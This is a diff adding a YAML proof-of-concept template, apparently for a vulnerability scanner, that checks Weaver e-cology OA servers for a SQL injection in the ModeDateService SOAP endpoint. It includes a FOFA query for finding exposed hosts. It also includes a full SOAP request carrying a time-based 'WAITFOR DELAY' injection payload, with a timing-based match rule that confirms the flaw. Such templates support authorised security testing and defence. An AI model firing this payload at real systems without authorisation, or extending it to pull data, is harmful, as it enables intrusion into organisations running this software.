@@ -1,0 +1,26 @@
+id: poc-yaml-weaver-e-cology-modedateservice-sqli
+info:
+  name: 泛微OA Ecology ModeDateService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /services/ModeDateService
+  headers:
+    SOAPAction: ''
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:mod=\"http://localhost/services/ModeDateService\">\n   <soapenv:Header/>\
+    \   \n   <soapenv:Body>\n      <mod:getAllModeDataCount>\n    <mod:in0>1</mod:in0>\
+    \         \n    <mod:in1>1</mod:in1>         \n    <mod:in2>1=1 WAITFOR DELAY\
+    \ '0:0:{{.t1}}'</mod:in2>       \n    <mod:in3>1</mod:in3>\n    </mod:getAllModeDataCount>\n\
+    \  </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"services/ModeDateService") && contains(headers,"ecology_JSessionid=")
+    && contains(content_type,"text/xml") && duration > t1 && duration < t2
+transport: http
